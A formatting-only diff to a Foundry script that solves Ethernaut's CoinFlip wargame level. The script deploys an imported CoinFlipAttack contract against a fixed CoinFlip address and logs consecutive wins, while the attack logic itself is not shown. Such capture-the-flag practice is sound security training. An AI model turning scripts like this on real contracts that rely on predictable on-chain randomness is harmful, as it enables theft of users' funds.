@@ -15,8 +15,7 @@ import {CoinFlip, CoinFlipAttack} from "../../src/ethernaut/03.sol";
  */
 
 contract CoinFlipScript is Script {
-    CoinFlip public coinFlipContract =
-        CoinFlip(0x193f876129B7EE7Bc617E21837EEcA2A704A9b46);
+    CoinFlip public coinFlipContract = CoinFlip(0x193f876129B7EE7Bc617E21837EEcA2A704A9b46);
     CoinFlipAttack public coinFlipAttackContract;
 
     function setUp() public {
@@ -27,20 +26,14 @@ contract CoinFlipScript is Script {
         vm.startBroadcast();
 
         console.log("CoinFlip contract: ", address(coinFlipContract));
-        console.log(
-            "Consecutive wins before tx: ",
-            coinFlipContract.consecutiveWins()
-        );
+        console.log("Consecutive wins before tx: ", coinFlipContract.consecutiveWins());
 
         // Deploy and use a short-lived attacker so we only consume the blockhash once.
 
         CoinFlipAttack attacker = new CoinFlipAttack(address(coinFlipContract));
         attacker.attack();
 
-        console.log(
-            "Consecutive wins after tx: ",
-            coinFlipContract.consecutiveWins()
-        );
+        console.log("Consecutive wins after tx: ", coinFlipContract.consecutiveWins());
         vm.stopBroadcast();
     }
 }
